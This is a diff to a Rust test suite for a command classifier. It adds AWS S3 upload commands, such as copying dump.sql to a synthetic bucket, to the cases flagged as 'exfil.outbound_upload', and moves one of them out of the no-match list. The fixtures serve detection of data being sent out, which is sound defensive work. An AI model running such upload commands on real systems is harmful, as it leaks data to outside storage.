@@ -913,6 +913,9 @@ fn object_storage_uploads_match_in_both_views() {
         "rclone copy ./reports synthetic-remote:archive",
         "az storage blob upload --container-name c --name n --file dump.sql",
         "az storage blob upload-batch --destination c --source ./dist",
+        "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+        "aws s3 cp --region=us-east-1 dump.sql s3://synthetic-bucket/",
+        "aws s3 cp C:\\data\\dump.sql s3://synthetic-bucket/",
     ] {
         assert_eq!(
             session_and_action_match(command, "exfil.outbound_upload"),
@@ -930,7 +933,7 @@ fn object_storage_downloads_remote_copies_and_inventory_match_in_neither_view() 
         "gsutil cp gs://synthetic-bucket/a.tar .",
         "rclone copy synthetic-remote:archive ./reports",
         "aws s3 cp s3://synthetic-bucket/a s3://other-bucket/a",
-        "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+        "aws s3 cp s3://synthetic-bucket/a ./b --profile fixture",
         "az storage account list",
         "az storage blob download --container-name c --name n --file dump.sql",
     ] {
